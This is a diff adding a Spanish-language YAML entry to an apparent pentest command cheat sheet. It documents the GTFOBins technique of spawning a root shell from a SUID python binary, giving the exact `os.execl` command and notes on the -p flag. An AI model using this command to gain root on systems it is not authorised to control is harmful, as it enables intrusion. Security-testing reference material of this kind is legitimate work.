@@ -1,0 +1,15 @@
+# Abuso de un binario python con SUID para escalar a root (técnica de GTFOBins).
+tool: python
+area: privesc-linux
+url: https://gtfobins.github.io/gtfobins/python/
+commands:
+  - id: python-suid-shell
+    title: Shell de root con python SUID
+    cmd: |
+      /usr/bin/python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+    phase: privesc
+    tags: [suid, privesc]
+    notes: >-
+      Lánzalo con el binario de python que tenga el SUID (python2.7, python3...), con su ruta completa.
+      El flag -p de sh evita que descarte el euid de root al arrancar; sin él vuelves a ser tu usuario.
+    refs: [https://gtfobins.github.io/gtfobins/python/#suid]
